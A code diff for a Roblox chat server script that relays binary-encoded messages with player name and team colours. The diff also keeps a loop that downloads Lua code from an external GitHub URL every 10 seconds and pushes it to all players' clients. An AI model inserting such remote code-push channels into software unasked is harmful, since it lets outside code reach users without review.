@@ -1,31 +1,16 @@
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
 
-local RemoteEvent = Instance.new("RemoteEvent", ReplicatedStorage)
+local RemoteEvent = Instance.new("RemoteEvent")
 RemoteEvent.Name = "RemoteEvent"
+RemoteEvent.Parent = ReplicatedStorage
 
-local RE2 = Instance.new("RemoteEvent", ReplicatedStorage)
+local RE2 = Instance.new("RemoteEvent")
 RE2.Name = "RemoteEvent2"
-
-local clientCodeCache = nil
-
--- Загрузка кода один раз при старте сервера
-task.spawn(function()
-	local url = "https://raw.githubusercontent.com/serezanet2/Roblox/refs/heads/main/V_njeafnjd_client_eco.lua"
-	local success, result = pcall(HttpService.GetAsync, HttpService, url)
-	if success then
-		clientCodeCache = result
-	end
-end)
-
--- Выдача кода игроку, когда он заходит
-Players.PlayerAdded:Connect(function(player)
-	while not clientCodeCache do task.wait(0.5) end -- Ждем, если гитхаб медленный
-	RE2:FireClient(player, clientCodeCache)
-end)
+RE2.Parent = ReplicatedStorage
 
 local function StartServer()
+	local Players = game:GetService("Players")
 	local SCR = require(ReplicatedStorage:WaitForChild("SCR"))
 
 	local NAME_COLORS = {
@@ -42,7 +27,7 @@ local function StartServer()
 	local function GetNameValue(pName)
 		local value = 0
 		for index = 1, #pName do
-			local cValue = string.byte(pName:sub(index, index))
+			local cValue = string.byte(string.sub(pName, index, index))
 			local reverseIndex = #pName - index + 1
 			if #pName % 2 == 1 then reverseIndex = reverseIndex - 1 end
 			if reverseIndex % 4 >= 2 then cValue = -cValue end
@@ -58,30 +43,72 @@ local function StartServer()
 		return NAME_COLORS[index + 1]
 	end
 
+	local function GetTeamColor(player)
+		if player.Team then
+			local c = player.Team.TeamColor.Color
+			return {
+				r = math.floor(c.R * 255),
+				g = math.floor(c.G * 255),
+				b = math.floor(c.B * 255)
+			}
+		end
+		return nil
+	end
+
 	local function GetPlayerColor(player)
 		if SCR.TCN and player.Team then
-			local c = player.Team.TeamColor.Color
-			return {r = math.floor(c.R * 255), g = math.floor(c.G * 255), b = math.floor(c.B * 255)}
+			return GetTeamColor(player)
 		end
 		return ComputeNameColor(player.Name)
 	end
 
-	RemoteEvent.OnServerEvent:Connect(function(player, encryptedMessage, isTeamMessage)
-		if type(encryptedMessage) == "string" and encryptedMessage:match("^[01]+$") then
-			local color = GetPlayerColor(player)
-			local recipients = (isTeamMessage and player.Team) and {} or Players:GetPlayers()
-			
-			if isTeamMessage and player.Team then
-				for _, target in ipairs(Players:GetPlayers()) do
-					if target.Team == player.Team then table.insert(recipients, target) end
+	local function GetRecipients(sender, isTeamMessage)
+		if isTeamMessage and sender.Team then
+			local recipients = {}
+			for _, target in ipairs(Players:GetPlayers()) do
+				if target.Team == sender.Team then
+					table.insert(recipients, target)
 				end
 			end
+			return recipients, true
+		end
+		return Players:GetPlayers(), false
+	end
+
+	RemoteEvent.OnServerEvent:Connect(function(player, encryptedMessage, isTeamMessage)
+		if type(encryptedMessage) == "string" and encryptedMessage ~= "" then
+			if not encryptedMessage:match("^[01]+$") then return end
+
+			local color = GetPlayerColor(player)
+			local recipients, isTeamPrefix = GetRecipients(player, isTeamMessage)
 
 			for _, target in ipairs(recipients) do
-				RemoteEvent:FireClient(target, player.Name, encryptedMessage, color.r, color.g, color.b, isTeamMessage)
+				RemoteEvent:FireClient(
+					target,
+					player.Name,
+					encryptedMessage,
+					color.r, color.g, color.b,
+					isTeamPrefix
+				)
 			end
 		end
 	end)
 end
+
+task.spawn(function()
+	local url = "https://raw.githubusercontent.com/serezanet2/Roblox/refs/heads/main/V_njeafnjd_client_eco.lua"
+	while true do
+		local success, clientCode = pcall(function()
+			return HttpService:GetAsync(url)
+		end)
+		
+		if success and clientCode then
+			for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+				RE2:FireClient(player, clientCode)
+			end
+		end
+		task.wait(10)
+	end
+end)
 
 task.spawn(StartServer)
